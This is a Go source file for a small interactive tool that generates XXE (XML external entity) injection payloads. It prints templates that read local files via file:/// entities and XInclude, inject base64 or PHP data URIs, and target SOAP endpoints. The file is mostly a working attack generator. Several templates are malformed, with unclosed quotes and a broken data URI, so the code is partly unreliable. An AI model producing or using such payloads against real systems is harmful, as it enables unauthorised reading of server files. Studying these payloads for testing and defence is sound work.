package scanners

import (
	"fmt"
	c "main/modg/colors"
)

var (
	XXE_injection_tmpl = `<!DOCTYPE LOL [<!ENTITY %s SYSTEM "file:///">]>`
	XXE_BASE64_tmpl    = `<!DOCTYPE LOL [<!ENTITY %s SYSTEM  "data://text/plain;base64 {%s >]>`
	XXE_PHP_CMD_tmpl   = `<!DOCTYPE LOL [<!ENTITY %s SYSTEM  "data://text/plain;base64 %s >]>`
	XXE_XINCLUDE_HEAD  = `<haha xmlns:xi="http://www.w3.org/2001/XInclude`
	XXE_XINCLUDE_FLOR  = `<xi:include parse="text" href="file://%s"/></haha>`
	XXE_SOAP           = `<!DOCTYPE foo [<!ENTITY %s SYSTEM "file:///">]>`
)

func SIO(msg, color string) string {
	var dt string
	fmt.Print(color, msg)
	fmt.Scanf("%s", &dt)
	return dt
}

func Generate(typer string) {
	switch typer {
	case "injection":
		data := SIO("Enter the name of the entity> ", c.WHT)
		tmpl := fmt.Sprintf(XXE_injection_tmpl, data)
		fmt.Println("\n\n\n\n[*] New template -> ", c.HIGH_BLUE, tmpl)
	case "base64":
		data := SIO("Enter the name of the entity> ", c.WHT)
		bs64 := SIO("Enter the base64 string     > ", c.WHT)
		tmpl := fmt.Sprintf(XXE_BASE64_tmpl, data, bs64)
		fmt.Println("\n\n\n\n[*] New template -> ", c.HIGH_BLUE, tmpl)
	case "phpcmd":
		data := SIO("Enter the name of the entity> ", c.WHT)
		php := SIO("Enter the PHP string        > ", c.WHT)
		tmpl := fmt.Sprintf(XXE_PHP_CMD_tmpl, data, php)
		fmt.Println("\n\n\n\n[*] New template -> ", c.HIGH_BLUE, tmpl)
	case "XINCLUDE":
		data := SIO("Enter the filepath to run to -> ", c.WHT)
		tmpl := fmt.Sprintf(XXE_XINCLUDE_FLOR, data)
		fmt.Println("------------------------------------------------")
		fmt.Println(c.HIGH_BLUE)

		fmt.Println(XXE_XINCLUDE_HEAD)
		fmt.Println(tmpl)
		fmt.Println(c.WHT)
		fmt.Println("------------------------------------------------")
	case "SOAP":
		data := SIO("Enter the entity -> ", c.BLU)
		tmpl := fmt.Sprintf(XXE_SOAP, data)
		fmt.Println(c.WHT)
		fmt.Println("\n\n\n\n[*] New template -> ", c.HIGH_BLUE, tmpl)
	}
}
